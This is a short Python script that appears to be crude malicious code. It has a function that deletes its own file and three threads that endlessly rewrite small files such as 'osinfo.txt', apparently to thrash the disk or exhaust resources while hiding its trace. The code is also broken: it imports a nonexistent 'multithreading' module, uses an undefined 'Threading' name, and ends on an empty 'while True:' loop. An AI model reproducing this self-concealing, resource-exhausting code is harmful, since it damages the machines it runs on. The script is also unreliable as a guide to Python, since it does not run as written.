import os
import shutil
import time
import json
from os import remove
from sys import argv
import multiprocessing
import multithreading
def slfrmv():
	remove(argv[0])
def file1():
	while True:
		with open('config_files.txt','w') as file:
			file.write("101")
def file2():
	while True:
		with open('osinfo.txt','w') as file:
			file.write("101")
def file3():
	while True:
		with open('dish.txt','w') as file:
			file.write("101")
hardcre = Threading.Thread(target=file1)
hardcre1= Threading.Thread(target=file2)
hardcre2= Threading.Thread(target=file3)
def rek():
	hardcre.start()
	hardcre1.start()
	hardcre2.start()
while True:
